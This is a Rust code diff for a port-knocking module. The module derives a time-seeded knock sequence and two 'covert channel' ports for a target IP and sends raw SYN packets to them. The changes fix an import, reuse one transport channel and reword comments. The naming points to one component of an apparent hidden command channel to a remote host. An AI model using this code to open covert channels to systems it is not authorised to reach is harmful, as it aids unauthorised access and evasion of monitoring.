@@ -7,10 +7,11 @@ use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
 use pnet::packet::ipv4::MutableIpv4Packet;
 use pnet::packet::ip::IpNextHeaderProtocols;
-use pnet::packet::MutablePacket;
-use pnet::transport::{transport_channel, TransportChannelType::Layer3};
+// 1. IMPORT THE TRAIT: This fixes the "no method named `payload_mut` found" error
+use pnet::packet::MutablePacket; 
+use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender};
 
-// --- RNG Implementation (Unchanged) ---
+// --- RNG Implementation ---
 pub struct SimpleRng {
     state: u64,
 }
@@ -30,11 +31,11 @@ impl SimpleRng {
     }
 }
 
-// --- Updated Session Struct ---
+// --- Session Struct ---
 pub struct KnockSession {
     pub stop_flag: Arc<AtomicBool>,
-    pub tx_port: u16, // Port we SEND to (Target's Listener)
-    pub rx_port: u16, // Port we LISTEN on (Target sends here)
+    pub tx_port: u16, // Port the Target listens on (Covert DST)
+    pub rx_port: u16, // Port the Target replies to (Covert SRC)
 }
 
 impl KnockSession {
@@ -45,7 +46,6 @@ impl KnockSession {
 
 pub fn generate_seed(ip: &Ipv4Addr, offset: i64) -> u64 {
     let ip_u32: u32 = (*ip).into();
-    // Use 1-minute windows for the seed, allowing for the offset to handle drift
     let time_step = (SystemTime::now()
         .duration_since(UNIX_EPOCH)
         .unwrap()
@@ -54,36 +54,34 @@ pub fn generate_seed(ip: &Ipv4Addr, offset: i64) -> u64 {
     (ip_u32 as u64) ^ (time_step as u64)
 }
 
-pub fn port_knock(ip: Ipv4Addr) -> io::Result<KnockSession> {
-    let seed = generate_seed(&ip, 0);
+/// Initializes the knocking sequence and returns the ports needed for covert.rs
+pub fn port_knock(target_ip: Ipv4Addr) -> io::Result<KnockSession> {
+    let seed = generate_seed(&target_ip, 0);
     let mut rng = SimpleRng::new(seed);
     
-    // 1. Generate the 3-port knock sequence
     let knocks = [rng.gen_port(), rng.gen_port(), rng.gen_port()];
-    
-    // 2. Generate Command & Response ports deterministically
-    let tx_port = rng.gen_port(); // The port the Target will listen on
-    let rx_port = rng.gen_port(); // The port the Target will send back to
+    let tx_port = rng.gen_port(); 
+    let rx_port = rng.gen_port(); 
 
-    println!("[*] Secret Knock: {:?}", knocks);
-    println!("[*] Derived Channels -> TX: {} | RX: {}", tx_port, rx_port);
+    println!("[+] Knocking Sequence: {:?}", knocks);
+    println!("[+] Covert Channel -> Target Listener: {} | Local Listener: {}", tx_port, rx_port);
 
+    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Tcp))?;
     let stop_flag = Arc::new(AtomicBool::new(false));
     let stop_clone = stop_flag.clone();
 
-    // Spawn background knocker
     thread::spawn(move || {
         while !stop_clone.load(Ordering::SeqCst) {
-            for port in knocks.iter() {
+            for &port in &knocks {
                 if stop_clone.load(Ordering::SeqCst) { break; }
                 
                 let start = Instant::now();
-                // Knock duration logic
-                while start.elapsed() < Duration::from_millis(800) {
-                    let _ = send_syn(ip, *port);
-                    thread::sleep(Duration::from_millis(150));
+                // Send a burst of SYNs to the knock port
+                while start.elapsed() < Duration::from_millis(500) {
+                    let _ = send_raw_syn(&mut tx, target_ip, port);
+                    thread::sleep(Duration::from_millis(100));
                 }
-                thread::sleep(Duration::from_millis(300));
+                thread::sleep(Duration::from_millis(200));
             }
         }
     });
@@ -91,8 +89,8 @@ pub fn port_knock(ip: Ipv4Addr) -> io::Result<KnockSession> {
     Ok(KnockSession { stop_flag, tx_port, rx_port })
 }
 
-fn send_syn(dest_ip: Ipv4Addr, dest_port: u16) -> io::Result<()> {
-    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Tcp))?;
+/// Minimal Layer 3 SYN packet to trigger the knock
+fn send_raw_syn(tx: &mut TransportSender, dest_ip: Ipv4Addr, dest_port: u16) -> io::Result<()> {
     let mut buffer = [0u8; 40];
     let mut ip = MutableIpv4Packet::new(&mut buffer).unwrap();
 
@@ -103,8 +101,9 @@ fn send_syn(dest_ip: Ipv4Addr, dest_port: u16) -> io::Result<()> {
     ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
     ip.set_destination(dest_ip);
 
+    // 2. NOW WORKS: Because MutablePacket is in scope, ip.payload_mut() is accessible
     let mut tcp = MutableTcpPacket::new(ip.payload_mut()).unwrap();
-    tcp.set_source(40000 + (dest_port % 2000));
+    tcp.set_source(54321); 
     tcp.set_destination(dest_port);
     tcp.set_flags(TcpFlags::SYN);
     tcp.set_data_offset(5);
